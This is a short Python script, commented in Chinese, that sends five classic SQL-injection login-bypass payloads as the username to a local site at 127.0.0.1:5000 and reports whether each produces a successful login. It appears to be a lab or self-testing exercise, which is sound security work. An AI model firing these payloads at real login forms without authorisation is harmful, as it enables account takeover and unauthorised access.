import requests

# 本地网站地址
url = "http://127.0.0.1:5000/"

# 构造一组注入 payload（也可以扩展成文件加载）
payloads = [
    "' or '1'='1",
    "' or '1'='1' -- ",
    "' OR 1=1#",
    "' OR 1=1--",
    "' or '' = '",
]

def test_sql_injection():
    print("🎯 正在测试 SQL 注入漏洞...\n")

    for i, payload in enumerate(payloads):
        data = {
            'username': payload,
            'password': 'anything'
        }

        response = requests.post(url, data=data)

        if "登录成功" in response.text:
            print(f"❗ [注入成功] Payload #{i+1}：{payload}")
        else:
            print(f"✅ [安全] Payload #{i+1}：{payload}")

if __name__ == "__main__":
    test_sql_injection()
